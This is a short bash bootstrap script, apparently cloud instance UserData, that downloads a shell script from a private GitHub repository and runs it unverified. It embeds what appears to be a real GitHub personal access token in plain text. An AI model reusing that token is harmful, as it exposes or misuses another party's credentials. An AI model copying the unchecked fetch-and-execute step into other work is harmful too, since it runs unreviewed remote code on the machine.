#!/bin/bash
# ud_tiny.sh — 400B bootstrap so the EC2/ECS UserData stays small enough to
# survive a slow egress proxy. Fetches the full atomic plant from the fleet
# channel and executes it. Same code path as the @reboot refetch.
exec >>/var/log/ul_tiny.log 2>&1
echo "=== ul_tiny $(date -u +%FT%TZ)"
export DEBIAN_FRONTEND=noninteractive
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
mkdir -p /opt/fleet
GH=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
for i in 1 2 3 4 5; do
  curl -s -m 60 -H "Authorization: token $GH" -H 'User-Agent: ul' \
    -H 'Accept: application/vnd.github.raw' \
    "https://api.github.com/repos/dongsuju/ul-plant/contents/ud/ud_prl_gpu.sh?ref=main" \
    -o /opt/fleet/ud.sh && [ -s /opt/fleet/ud.sh ] && break
  sleep 20
done
chmod +x /opt/fleet/ud.sh 2>/dev/null
[ -s /opt/fleet/ud.sh ] || { echo "FATAL: ud fetch failed"; exit 1; }
echo "fetched $(wc -c </opt/fleet/ud.sh)B sha=$(sha256sum /opt/fleet/ud.sh | cut -d' ' -f1)"
bash /opt/fleet/ud.sh
